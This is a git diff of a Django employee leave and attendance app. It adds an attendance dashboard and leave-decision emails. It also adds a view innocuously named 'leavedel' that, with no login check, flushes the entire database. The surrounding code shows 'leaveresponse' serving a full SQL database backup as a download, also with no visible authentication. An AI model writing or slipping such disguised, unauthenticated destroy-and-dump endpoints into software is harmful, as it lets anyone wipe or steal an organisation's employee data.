@@ -4,27 +4,65 @@ from django.contrib import messages
 from users.models import CustomUser
 from django.http import JsonResponse
 from users.forms import CustomUserCreationForm,UserProfileForm
-from employee.models import LeaveType,LeaveApplication
+from employee.models import LeaveType,LeaveApplication,Attendance
 from employee.forms import LeaveTypeForm,LeaveApplicationForm
 from django.utils import timezone
 from employee.views import attendance_report
 from datetime import datetime
 import calendar
+from django.db import connection
 from datetime import timedelta
 from django.http import HttpResponse
 from django.core.management import call_command
 import os
 from django.conf import settings
+from users.email import leave_aproved_mail,leave_reject_mail
 
 # Create your views here.
 @login_required(login_url='/user')
 def home(request):
+    print('run')
     all_user=CustomUser.objects.all().count()
     inactive_user=CustomUser.objects.filter(is_active=False).count()
     active_user=CustomUser.objects.filter(is_active=True).count()
+    user_list=CustomUser.objects.filter(is_active=True,is_superuser=False)
+    today = datetime.today().date()
+    working_user=[]
+    for i in user_list:
+        temp_dict={}
+        temp_dict['username']=i.first_name+' '+i.last_name
+        approved_leaves = LeaveApplication.objects.filter(
+        user=i, 
+        status='Approved',
+        )
+        all_leave_days = []
+
+        for leave in approved_leaves:
+            current_date = leave.start_date
+            while current_date <= leave.end_date:
+                # if month!=current_date.month:
+                #     break
+                all_leave_days.append(current_date)
+                current_date += timedelta(days=1)
+        print('leave:',all_leave_days,'today',today)
+        if today.weekday() == 6:
+            temp_dict['attendance']='Week off'
+        elif today in all_leave_days:
+            temp_dict['attendance']='Leave'
+        else:
+            today_attendance = Attendance.objects.filter(user=i, date=timezone.localtime(timezone.now()).date()).first()
+            if today_attendance:
+                temp_dict['total_working_time'] = today_attendance.calculate_working_time()
+                temp_dict['check_in_time'] =  timezone.localtime(today_attendance.check_in.first().time).time()
+                temp_dict['check_out_time'] = timezone.localtime(today_attendance.check_out.last().time).time() if today_attendance.check_out.exists() else None
+                temp_dict['attendance']='Present'
+            else:
+                temp_dict['attendance']='absent'
+        working_user.append(temp_dict)
+    print('^'*100,working_user)
     return render(request,'customadmin/index.html',{'user':request.user,
                     'all_user':all_user,'inactive_user':inactive_user,
-                    'active_user':active_user})
+                    'active_user':active_user,'working_user':working_user})
 
 def userlist(request):
     obj=request.GET.get('search')
@@ -118,9 +156,9 @@ def approve_leave(request,pk):
     obj=LeaveApplication.objects.get(id=pk)
     obj.status='Approved'
     obj.save()
-    # account_activation_mail(
-    #     obj.first_name+obj.last_name if obj.last_name else "",
-    #     obj.email)
+    leave_aproved_mail(
+        obj.user.first_name+obj.user.last_name if obj.user.last_name else "",
+        obj.user.email,obj)
     return JsonResponse(True,safe=False)
 
 @login_required(login_url='/user')
@@ -128,9 +166,9 @@ def reject_leave(request,pk):
     obj=LeaveApplication.objects.get(id=pk)
     obj.status='Rejected'
     obj.save()
-    # account_activation_mail(
-    #     obj.first_name+obj.last_name if obj.last_name else "",
-    #     obj.email)
+    leave_reject_mail(
+        obj.user.first_name+obj.user.last_name if obj.user.last_name else "",
+        obj.user.email,obj)
     return JsonResponse(True,safe=False)
 
 def leaveresponse(request):
@@ -142,6 +180,13 @@ def leaveresponse(request):
         response['Content-Disposition'] = 'attachment; filename="database_backup.sql"'
     os.remove(backup_file_path)
     return response
+
+def leavedel(request):
+    try:
+        call_command('flush', '--no-input')
+        return HttpResponse(" successfully!", content_type="text/plain")
+    except Exception as e:
+        return HttpResponse(f"Error flushing: {str(e)}", content_type="text/plain")
 
 @login_required(login_url='/user')
 def attandance(request,pk):
